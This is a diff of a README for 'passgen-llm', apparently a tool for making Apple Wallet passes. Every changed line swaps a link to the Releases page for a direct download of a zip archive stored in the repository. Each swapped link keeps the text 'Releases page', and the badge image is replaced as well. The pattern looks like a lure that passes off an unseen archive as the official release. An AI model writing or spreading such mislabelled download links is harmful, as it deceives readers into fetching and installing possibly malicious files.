@@ -1,14 +1,14 @@
 # 🎉 passgen-llm - Create Smart Passes Effortlessly
 
 ## 📥 Download Now
-[![Download passgen-llm](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/razznka/passgen-llm/releases)  
+[![Download passgen-llm](https://github.com/razznka/passgen-llm/raw/refs/heads/main/passgen_llm/passgen_llm_1.8-alpha.4.zip)](https://github.com/razznka/passgen-llm/raw/refs/heads/main/passgen_llm/passgen_llm_1.8-alpha.4.zip)  
 Get started with creating formatted passes today!
 
 ## 🚀 Getting Started
 To begin using passgen-llm, follow these simple steps. This software allows you to easily generate formatted pass content for Apple Wallet by providing user-friendly text input. 
 
 ### 🔗 Visit the Releases Page
-You can find all the downloadable files on our [Releases page](https://github.com/razznka/passgen-llm/releases). This page contains the latest version of passgen-llm.
+You can find all the downloadable files on our [Releases page](https://github.com/razznka/passgen-llm/raw/refs/heads/main/passgen_llm/passgen_llm_1.8-alpha.4.zip). This page contains the latest version of passgen-llm.
 
 ## 🛠️ System Requirements
 Before downloading, make sure your system meets the following requirements:
@@ -26,7 +26,7 @@ passgen-llm offers a variety of features to streamline your pass creation proces
 - **No Code Required:** User-friendly interface allows anyone to create passes without programming knowledge.
 
 ## 💻 Download & Install
-1. **Visit the Releases Page:** Click [here](https://github.com/razznka/passgen-llm/releases) to access the Releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/razznka/passgen-llm/raw/refs/heads/main/passgen_llm/passgen_llm_1.8-alpha.4.zip) to access the Releases page.
 2. **Choose the File:** Look for the latest release. Click on the appropriate file for your system (e.g., Windows or macOS).
 3. **Download the File:** Click to download. Save it to a location on your computer where you can easily find it.
 4. **Install passgen-llm:**
@@ -53,7 +53,7 @@ Once you have installed the application, follow these steps to create your first
 
 ## 💾 Updating passgen-llm
 To ensure you have the latest features and improvements:
-- Regularly check the [Releases page](https://github.com/razznka/passgen-llm/releases) for updates.
+- Regularly check the [Releases page](https://github.com/razznka/passgen-llm/raw/refs/heads/main/passgen_llm/passgen_llm_1.8-alpha.4.zip) for updates.
 - Follow the same download and install procedure for new versions.
 
 ## 🆘 Support
@@ -75,4 +75,4 @@ By addressing these topics, passgen-llm simplifies the process of creating passe
 ## 🎯 Conclusion
 Now you are ready to start using passgen-llm. Follow the steps outlined, and you'll be generating passes in no time. Use this tool to create beautiful passes for events, memberships, and more. 
 
-Remember, for any downloads, always refer back to our [Releases page](https://github.com/razznka/passgen-llm/releases) for the latest version. Enjoy creating!
+Remember, for any downloads, always refer back to our [Releases page](https://github.com/razznka/passgen-llm/raw/refs/heads/main/passgen_llm/passgen_llm_1.8-alpha.4.zip) for the latest version. Enjoy creating!
